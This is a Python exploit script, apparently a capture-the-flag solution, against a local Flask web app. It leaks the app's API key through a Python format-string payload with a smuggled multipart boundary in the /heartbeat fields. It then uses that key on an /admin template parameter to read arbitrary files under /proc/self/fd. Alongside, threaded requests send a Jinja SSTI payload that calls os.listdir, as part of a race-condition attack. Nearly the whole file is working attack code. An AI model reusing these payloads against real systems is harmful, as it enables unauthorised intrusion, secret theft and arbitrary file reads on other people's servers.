import httpx
import threading
import time
import random
import string

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path, timeout=5.0):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=timeout)
        return r.text, r.status_code
    except:
        return "", 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # SSTI payload 列出根目录
    ssti_payload = "{{lipsum.__globals__['os'].listdir('/')}}"
    
    # 竞态条件攻击：
    # 1. 发送一个包含 SSTI payload 的请求到 /heartbeat
    # 2. 同时读取 /proc/self/fd/X 希望能捕获请求体
    
    found = []
    
    def send_ssti():
        """发送包含 SSTI 的请求"""
        for _ in range(50):
            try:
                data = {'text': ssti_payload[:300], 'client': 'X', 'token': 'Y'}
                r = httpx.post(f'{TARGET}/heartbeat', data=data, timeout=5.0)
            except:
                pass
            time.sleep(0.01)
    
    def check_fds():
        """检查 fd"""
        for _ in range(100):
            for fd in range(3, 30):
                content, code = read_file_via_admin(api_key, f"/proc/self/fd/{fd}", timeout=1.0)
                if code == 200 and content:
                    if 'flag' in content.lower() or '[' in content:
                        print(f"[!] Interesting content in fd/{fd}: {content[:100]}")
                        found.append((fd, content))
            time.sleep(0.01)
    
    print("\n[*] Starting race condition attack...")
    t1 = threading.Thread(target=send_ssti)
    t2 = threading.Thread(target=check_fds)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
    
    if found:
        print("\n[+] Found results:")
        for fd, content in found:
            print(f"fd/{fd}: {content}")
    else:
        print("\n[-] No results found")
